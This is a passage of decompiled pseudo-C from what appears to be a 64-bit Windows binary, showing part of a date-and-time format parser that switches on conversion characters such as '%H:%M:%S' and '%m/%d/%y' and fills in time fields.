uStack392 != NULL;\n            cVar2 = (**(*arg1_00 + 0x20))(arg1_00);\n            bVar10 = bVar20 && cVar21;\n            if ((bVar10) && (cVar21 = bVar10,  piVar15[3] <= piVar15[2])) {\n                in_stack_fffffffffffffe38 = in_stack_fffffffffffffe38 & 0xffffffffffffff00 | bVar10;\n                iVar6 = (**(*piVar15 + 0x48))(piVar15);\n                if (iVar6 == -1) {\n                    piVar15 = NULL;\n                    uStack392 = NULL;\n                    cVar21 = '\\0';\n                }\n                else {\n                    cVar21 = in_stack_fffffffffffffe38;\n                }\n            }\n            cVar3 = (**(*arg1_00 + 0x20))();\n            if (cVar2 != cVar3) {\n                cVar2 = (**(*arg1_00 + 0x10))(arg1_00);\n                if ((((cVar21 != '\\0') && (bVar20)) && (piVar15[3] <= piVar15[2])) &&\n                   (iVar6 = (**(*piVar15 + 0x48))(piVar15),  iVar6 == -1)) {\n                    uStack392 = NULL;\n                }\n                cVar21 = (**(*arg1_00 + 0x10))();\n                piVar15 = uStack392;\n                if (cVar2 != cVar21) goto code_r0x00014002e43c;\n            }\ncode_r0x00014002e500:\n            if (piVar15[2] < piVar15[3]) {\n                piVar15[2] = piVar15[2] + 1;\n            }\n            else {\n                (**(*piVar15 + 0x50))();\n            }\n            uStack384 = 0xffffffff;\n            uVar11 = 0xffffffff;\n            piVar25 = arg_80h;\n            goto code_r0x00014002e457;\n        }\ncode_r0x00014002e390:\n        if (uVar22 != 0x25) goto code_r0x00014002e398;\n        uVar14 = uVar13 + 1;\n        uVar4 = *(in_stack_00000040 + 1 + uVar13);\n        uVar22 = *(arg1_00 + uVar4 + 0x139);\n        in_stack_fffffffffffffe18 = ppiVar24;\n        if (uVar22 == 0) {\n            uVar22 = uVar4;\n            if (*(*arg1_00 + 0x40) != 0x140025c30) {\n                uVar22 = (**(*arg1_00 + 0x40))();\n                in_stack_fffffffffffffe18 = ppiVar24;\n            }\n            if (uVar22 != 0) {\n                *(arg1_00 + uVar4 + 0x139) = uVar22;\n                goto code_r0x00014002e5a3;\n            }\ncode_r0x00014002e43c:\n            uStack368 = 4;\n            piVar15 = uStack392;\n            uVar23 = 4;\n            piVar25 = arg_80h;\n            goto code_r0x00014002e457;\n        }\ncode_r0x00014002e5a3:\n        uStack364 = 0;\n        if ((uVar22 == 0x45) || (uVar22 == 0x4f)) {\n            uVar14 = uVar13 + 2;\n            uVar4 = *(in_stack_00000040 + uVar14);\n            uVar22 = *(arg1_00 + uVar4 + 0x139);\n            if (uVar22 == 0) {\n                uVar22 = uVar4;\n                if (*(*arg1_00 + 0x40) != 0x140025c30) {\n                    uVar22 = (**(*arg1_00 + 0x40))();\n                }\n                if (uVar22 == 0) goto code_r0x00014002e43c;\n                *(arg1_00 + uVar4 + 0x139) = uVar22;\n            }\n        }\n        piVar15 = uStack392;\n        bVar10 = piVar19 != NULL && bVar17;\n    // switch table (85 cases) at 0x1400fde2c\n        switch(uVar22 - 0x25) {\n        case 0:\n            uVar13 = uVar11;\n            if ((uStack392 != NULL) && (bVar20)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uVar13 = *uStack392[2];\n                }\n                else {\n                    in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar22;\n                    uVar7 = (**(*uStack392 + 0x48))();\n                    uVar22 = in_stack_fffffffffffffe18;\n                    uVar13 = uVar7;\n                    if (uVar7 == 0xffffffff) {\n                        piVar15 = NULL;\n                        uStack392 = NULL;\n                    }\n                }\n            }\n            if (*(arg1_00 + 7) == '\\0') {\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar22;\n                fcn.140025400(arg1_00);\n                cVar21 = in_stack_fffffffffffffe18;\n                if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                    cVar21 = (**(*arg1_00 + 0x30))();\n                }\n            }\n            else {\n                cVar21 = *(arg1_00 + 0x5e);\n            }\n            if (cVar21 != uVar13) {\n                uStack368 = 4;\n                uVar23 = 4;\n                piVar25 = arg_80h;\n                break;\n            }\n            goto code_r0x00014002e500;\n        default:\n            goto code_r0x00014002e43c;\n        case 0x1c:\n        case 0x3c:\n            iVar1 = *(arg_88h + 0x10);\n            uStack280 = *(iVar1 + 0xa8);\n            uStack276 = *(iVar1 + 0xac);\n            uStack272 = *(iVar1 + 0xb0);\n            uStack268 = *(iVar1 + 0xb4);\n            uStack344 = *(iVar1 + 0x68);\n            uStack340 = *(iVar1 + 0x6c);\n            uStack336 = *(iVar1 + 0x70);\n            uStack332 = *(iVar1 + 0x74);\n            uStack328 = *(iVar1 + 0x78);\n            uStack324 = *(iVar1 + 0x7c);\n            uStack320 = *(iVar1 + 0x80);\n            uStack316 = *(iVar1 + 0x84);\n            uStack312 = *(iVar1 + 0x88);\n            uStack308 = *(iVar1 + 0x8c);\n            uStack304 = *(iVar1 + 0x90);\n            uStack300 = *(iVar1 + 0x94);\n            uStack296 = *(iVar1 + 0x98);\n            uStack292 = *(iVar1 + 0x9c);\n            uStack288 = *(iVar1 + 0xa0);\n            uStack284 = *(iVar1 + 0xa4);\n            uStack264 = *(iVar1 + 0xb8);\n            uStack260 = *(iVar1 + 0xbc);\n            uStack256 = *(iVar1 + 0xc0);\n            uStack252 = *(iVar1 + 0xc4);\n            pcStack360 = *(iVar1 + 0x58);\n            pcStack352 = *(iVar1 + 0x60);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002d370(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &pcStack360, 0xe, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                          in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, in_stack_fffffffffffffe38);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[6] = uStack364 % 7;\n            *in_stack_00000048 = *in_stack_00000048 | 2;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x1d:\n        case 0x3d:\n        case 0x43:\n            iVar1 = *(arg_88h + 0x10);\n            uStack216 = *(iVar1 + 0x158);\n            uStack212 = *(iVar1 + 0x15c);\n            uStack208 = *(iVar1 + 0x160);\n            uStack204 = *(iVar1 + 0x164);\n            uStack264 = *(iVar1 + 0x128);\n            uStack260 = *(iVar1 + 300);\n            uStack256 = *(iVar1 + 0x130);\n            uStack252 = *(iVar1 + 0x134);\n            uStack248 = *(iVar1 + 0x138);\n            uStack244 = *(iVar1 + 0x13c);\n            uStack240 = *(iVar1 + 0x140);\n            uStack236 = *(iVar1 + 0x144);\n            uStack232 = *(iVar1 + 0x148);\n            uStack228 = *(iVar1 + 0x14c);\n            uStack224 = *(iVar1 + 0x150);\n            uStack220 = *(iVar1 + 0x154);\n            uStack200 = *(iVar1 + 0x168);\n            uStack196 = *(iVar1 + 0x16c);\n            uStack192 = *(iVar1 + 0x170);\n            uStack188 = *(iVar1 + 0x174);\n            uStack184 = *(iVar1 + 0x178);\n            uStack180 = *(iVar1 + 0x17c);\n            uStack176 = *(iVar1 + 0x180);\n            uStack172 = *(iVar1 + 0x184);\n            uStack296 = *(iVar1 + 0x108);\n            uStack292 = *(iVar1 + 0x10c);\n            uStack288 = *(iVar1 + 0x110);\n            uStack284 = *(iVar1 + 0x114);\n            uStack280 = *(iVar1 + 0x118);\n            uStack276 = *(iVar1 + 0x11c);\n            uStack272 = *(iVar1 + 0x120);\n            uStack268 = *(iVar1 + 0x124);\n            uStack344 = *(iVar1 + 0xd8);\n            uStack340 = *(iVar1 + 0xdc);\n            uStack336 = *(iVar1 + 0xe0);\n            uStack332 = *(iVar1 + 0xe4);\n            uStack328 = *(iVar1 + 0xe8);\n            uStack324 = *(iVar1 + 0xec);\n            uStack320 = *(iVar1 + 0xf0);\n            uStack316 = *(iVar1 + 0xf4);\n            uStack312 = *(iVar1 + 0xf8);\n            uStack308 = *(iVar1 + 0xfc);\n            uStack304 = *(iVar1 + 0x100);\n            uStack300 = *(iVar1 + 0x104);\n            pcStack360 = *(iVar1 + 200);\n            pcStack352 = *(iVar1 + 0xd0);\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002d370(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &pcStack360, 0x18, in_stack_00000028, \n                          &uStack368, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                          in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, in_stack_fffffffffffffe38);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[4] = uStack364 % 0xc;\n            *in_stack_00000048 = *in_stack_00000048 | 0x408;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x1e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            *in_stack_00000048 = *in_stack_00000048 | 0x480;\n            in_stack_00000048[1] = uStack364;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x1f:\n            if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x00014002fa0a:\n                pcStack352 = pcStack352 & 0xffffffffffffff00;\n                pcStack360 = 0x79252f64252f6d25;\n            }\n            else {\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.140025400(arg1_00);\n                }\n                if (*(*arg1_00 + 0x38) == 0x140025bc0) goto code_r0x00014002fa0a;\n                (**(*arg1_00 + 0x38))(arg1_00, 0x1400fde14, 0x1400fde1d, &pcStack360);\n            }\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            piStack432 = arg_80h;\n            goto code_r0x00014002f642;\n        case 0x23:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[2] = uStack364;\n            *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x24:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[2] = uStack364 % 0xc;\n            *in_stack_00000048 = *in_stack_00000048 | 1;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x28:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[1] = uStack364;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x2d:\n            if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x00014002ef72:\n                pcStack360 = pcStack360 & 0xffff000000000000 | 0x4d253a4825;\n            }\n            else {\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.140025400(arg1_00);\n                }\n                if (*(*arg1_00 + 0x38) == 0x140025bc0) goto code_r0x00014002ef72;\n                (**(*arg1_00 + 0x38))(arg1_00, 0x1400fde1d, 0x1400fde23, &pcStack360);\n            }\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x00014002efd4;\n        case 0x2e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                *in_stack_00000038 = uStack364;\n            }\n            goto code_r0x00014002f120;\n        case 0x2f:\n            if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x00014002f152:\n                pcStack352 = pcStack352 & 0xffffffffffffff00;\n                pcStack360 = 0x53253a4d253a4825;\n            }\n            else {\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.140025400(arg1_00);\n                }\n                if (*(*arg1_00 + 0x38) == 0x140025bc0) goto code_r0x00014002f152;\n                (**(*arg1_00 + 0x38))(arg1_00, 0x1400fde23, 0x1400fde2c, &pcStack360);\n            }\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            goto code_r0x00014002efd4;\n        case 0x30:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffff00000000 | *in_stack_00000048;\n                uVar23 = (uStack364 & 0x3f) << 0x10 | 0x20;\n                uVar7 = *in_stack_00000048 & 0xffc0ffdf;\ncode_r0x00014002f278:\n                *in_stack_00000048 = uVar23 | uVar7;\n                uStack392 = piStack408;\n                uStack384 = uStack400;\n            }\n            goto code_r0x00014002f120;\n        case 0x32:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffff00000000 | *in_stack_00000048;\n                uVar23 = (uStack364 & 0x3f) << 0x10 | 0x40;\n                uVar7 = *in_stack_00000048 & 0xffc0ffbf;\n                goto code_r0x00014002f278;\n            }\n            goto code_r0x00014002f120;\n        case 0x33:\n            goto code_r0x00014002f39a;\n        case 0x34:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 == 0) {\n                in_stack_00000038[5] = uStack364 - 0x76c;\n                in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xf9 | 4;\n            }\ncode_r0x00014002f120:\n            uVar11 = uStack384;\n            piVar15 = uStack392;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            piStack408 = uStack392;\n            uStack400 = uStack384;\n            break;\n        case 0x35:\n            uVar13 = uVar11;\n            if ((uStack392 != NULL) && (bVar20)) {\n                if (uStack392[2] < uStack392[3]) {\n                    uVar13 = *uStack392[2];\n                }\n                else {\n                    uVar13 = (**(*uStack392 + 0x48))();\n                    if (uVar13 == -1) {\n                        uStack392 = NULL;\n                    }\n                }\n            }\n            if ((*(arg1_00[6] + (uVar13 & 0xff) * 2) & 1) == 0) goto code_r0x00014002e43c;\n            noname_8 = &uStack368;\n            in_stack_fffffffffffffe18 = &piStack440;\n            arg3 = &uStack424;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002d370(&piStack408, arg2, arg3, in_stack_fffffffffffffe18, &pcStack360, *0x140102ce0, 0xe, \n                          in_stack_00000028, noname_8, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                          in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, arg3);\n            cVar21 = uStack400 == 0xffffffff;\n            uStack392 = piStack408;\n            uVar11 = uStack400;\n            uStack384 = uStack400;\n            bVar20 = piStack408 != NULL && cVar21;\n            if (bVar20) {\n                if ((piStack408[2] < piStack408[3]) ||\n                   (cVar21 = bVar20,  iVar6 = (**(*piStack408 + 0x48))(),  iVar6 != -1)) {\n                    cVar21 = '\\0';\n                }\n                else {\n                    uStack392 = NULL;\n                }\n            }\n            if ((bVar10) && (bVar17 = false,  piVar19[3] <= piVar19[2])) {\n                iVar6 = (**(*piVar19 + 0x48))();\n                if (iVar6 == -1) {\n                    piVar19 = NULL;\n                }\n                bVar17 = iVar6 == -1 && bVar10;\n            }\n            piVar15 = uStack392;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            in_stack_fffffffffffffe38 = arg3;\n            if ((cVar21 != bVar17) && ((uStack368 | pcStack360) == 0)) {\n                cVar21 = fcn.140023fd0(&uStack392);\n                if (*(arg1_00 + 7) == '\\0') {\n                    fcn.140025400(arg1_00);\n                    cVar2 = '-';\n                    if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                        cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                    }\n                }\n                else {\n                    cVar2 = *(arg1_00 + 0x66);\n                }\n                if (cVar21 != cVar2) {\n                    cVar21 = fcn.140023fd0(&uStack392);\n                    if (*(arg1_00 + 7) == '\\0') {\n                        fcn.140025400(arg1_00);\n                        cVar2 = '+';\n                        if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                            cVar2 = (**(*arg1_00 + 0x30))();\n                        }\n                    }\n                    else {\n                        cVar2 = *(arg1_00 + 100);\n                    }\n                    if (cVar21 != cVar2) {\n                        uVar11 = uStack384;\n                        piVar15 = uStack392;\n                        uVar23 = 0;\n                        piVar25 = arg_80h;\n                        in_stack_fffffffffffffe38 = arg3;\n                        break;\n                    }\n                }\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piVar25 = arg_80h;\n                in_stack_fffffffffffffe38 = arg3;\n                piStack440 = piVar19;\n                piStack432 = arg_80h;\n                fcn.14002cd90(&piStack408, arg2, arg3, in_stack_fffffffffffffe18);\n                uStack384 = uStack400;\n                uStack392 = piStack408;\n                uStack392._0_4_ = SUB84(piStack408, 0);\n                uStack392._4_4_ = piStack408 >> 0x20;\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack400;\n                uStack412 = uStack380;\n                piStack440 = piVar19;\n                piStack432 = arg_80h;\n                fcn.14002cd90(&piStack408, arg2, arg3, in_stack_fffffffffffffe18);\n                uStack384 = uStack400;\n                uStack392 = piStack408;\n                uVar11 = uStack400;\n                piVar15 = piStack408;\n                in_stack_fffffffffffffe00 = noname_8;\n                uVar23 = uStack368;\n            }\n            break;\n        case 0x3e:\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            piStack432 = arg_80h;\ncode_r0x00014002f642:\n            arg_80h = piStack432;\n            piStack440 = piVar19;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.14002e200(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x3f:\n        case 0x40:\n            if ((uStack392 == NULL) || (!bVar20)) {\ncode_r0x00014002ea82:\n                if ((*(arg1_00[6] + (uVar11 & 0xff) * 2) & 0x20) != 0) {\n                    puVar9 = uStack392[2];\n                    if (puVar9 < uStack392[3]) goto code_r0x00014003000a;\n                    (**(*uStack392 + 0x50))();\ncode_r0x000140030012:\n                    uStack384 = 0xffffffff;\n                }\n            }\n            else {\n                puVar9 = uStack392[2];\n                if (uStack392[3] <= puVar9) {\n                    uVar23 = (**(*uStack392 + 0x48))();\n                    uVar11 = uVar23;\n                    if (uVar23 == 0xffffffff) {\n                        uStack392 = NULL;\n                    }\n                    goto code_r0x00014002ea82;\n                }\n                if ((*(arg1_00[6] + *puVar9 * 2) & 0x20) != 0) {\ncode_r0x00014003000a:\n                    uStack392[2] = puVar9 + 1;\n                    goto code_r0x000140030012;\n                }\n            }\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[3] = uStack364;\n            *in_stack_00000048 = *in_stack_00000048 | 0x410;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x45:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[7] = uStack364 - 1;\n            *in_stack_00000048 = *in_stack_00000048 | 4;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x48:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[4] = uStack364 - 1;\n            *in_stack_00000048 = *in_stack_00000048 | 8;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x49:\n        case 0x4f:\n            do {\n                uVar22 = uVar11 == -1;\n                uVar4 = piVar15 != NULL && uVar22;\n                if (uVar4) {\n                    if (piVar15[3] <= piVar15[2]) {\n                        in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar4;\n                        iVar6 = (**(*piVar15 + 0x48))();\n                        uVar22 = in_stack_fffffffffffffe18;\n                        uVar4 = uVar22;\n                        if (iVar6 == -1) {\n                            uVar4 = 0;\n                            uStack392 = NULL;\n                            piVar15 = NULL;\n                            goto code_r0x00014002ed00;\n                        }\n                    }\n                    uVar22 = 0;\n                }\ncode_r0x00014002ed00:\n                bVar20 = piVar19 != NULL && bVar17;\n                bVar10 = bVar17;\n                if (bVar20) {\n                    if (piVar19[2] < piVar19[3]) {\n                        bVar10 = false;\n                    }\n                    else {\n                        in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar4;\n                        iVar6 = (**(*piVar19 + 0x48))();\n                        uVar4 = in_stack_fffffffffffffe18;\n                        if (iVar6 == -1) {\n                            piVar19 = NULL;\n                        }\n                        bVar10 = iVar6 == -1 && bVar20;\n                    }\n                }\n                piVar25 = arg_80h;\n                if (uVar22 == bVar10) break;\n                uVar13 = uVar11;\n                if (uVar4 == 0) {\ncode_r0x00014002ed26:\n                    piVar25 = arg_80h;\n                    if ((*(arg1_00[6] + (uVar13 & 0xff) * 2) & 0x20) == 0) break;\n                    puVar9 = piVar15[2];\n                    if (puVar9 < piVar15[3]) goto code_r0x00014002ed45;\n                    (**(*piVar15 + 0x50))();\n                }\n                else {\n                    puVar9 = piVar15[2];\n                    if (piVar15[3] <= puVar9) {\n                        uVar13 = (**(*piVar15 + 0x48))();\n                        if (uVar13 == -1) {\n                            piVar15 = NULL;\n                            uStack392 = NULL;\n                        }\n                        goto code_r0x00014002ed26;\n                    }\n                    if ((*(arg1_00[6] + *puVar9 * 2) & 0x20) == 0) break;\ncode_r0x00014002ed45:\n                    piVar15[2] = puVar9 + 1;\n                }\n                uStack384 = 0xffffffff;\n                uVar11 = 0xffffffff;\n            } while( true );\n        case 0x4b:\n            pcStack360 = *(*(arg_88h + 0x10) + 0x40);\n            pcStack352 = *(*(arg_88h + 0x10) + 0x48);\n            piVar25 = arg_80h;\n            if ((*pcStack360 != '\\0') && (*pcStack352 != '\\0')) {\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piStack440 = piVar19;\n                piStack432 = arg_80h;\n                fcn.14002d370(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &pcStack360, 2, in_stack_00000028\n                              , &uStack368, in_stack_fffffffffffffe00, noname_10, CONCAT44(iVar12, uVar23), \n                              in_stack_fffffffffffffe18, arg_78h, arg_80h, arg_88h, in_stack_fffffffffffffe38);\n                uStack392 = piStack408;\n                uStack384 = uStack400;\n                if ((uStack368 != 0) || (uStack364 == 0)) goto code_r0x00014002f120;\n                uVar11 = uStack400;\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                piVar15 = piStack408;\n                uVar23 = uStack368;\n                piVar25 = arg_80h;\n            }\n            break;\n        case 0x4d:\n            goto code_r0x00014002f39a;\n        case 0x52:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            if (uStack368 != 0) goto code_r0x00014002f120;\n            uVar11 = uStack400;\n            in_stack_00000038[6] = uStack364;\n            *in_stack_00000048 = *in_stack_00000048 | 2;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x53:\ncode_r0x00014002f39a:\n            uStack420 = uStack392._4_4_;\n            uStack424 = uStack392;\ncode_r0x00014002efd4:\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.14002e200(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uVar11 = uStack400;\n            uStack384 = uStack400;\n            piVar15 = piStack408;\n            uVar23 = uStack368;\n            piVar25 = arg_80h;\n            break;\n        case 0x54:\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar19;\n            piStack432 = arg_80h;\n            fcn.14002cd90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack400;\n            uVar23 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                bVar5 = piStack408 != NULL && uStack400 == 0xffffffff;\n                bVar20 = uStack400 == 0xffffffff;\n                if (bVar5) {\n                    if ((piStack408[2] < piStack408[3]) || (iVar6 = (**(*piStack408 + 0x48))(),  iVar6 != -1)) {\n                        bVar20 = false;\n                    }\n                    else {\n                        uStack392 = NULL;\n                        bVar20 = bVar5;\n                    }\n                }\n                bVar5 = bVar17;\n                bVar18 = bVar10;\n                if (((bVar10) && (bVar5 = false,  piVar19[3] <= piVar19[2])) &&\n                   (iVar6 = (**(*piVar19 + 0x48))(piVar19),  iVar6 == -1)) {\n                    piVar19 = NULL;\n                    bVar18 = false;\n                    bVar5 = bVar10;\n                }\n                if (bVar5 == bVar20) {\ncode_r0x00014002ffcd:\n                    uVar7 = uStack364;\n                    if (uStack364 < 0x45) {\n                        uVar7 = uStack364 + 100;\n                    }\n                }\n                else {\n                    uVar22 = fcn.140023fd0(&uStack392);\n                    uVar4 = 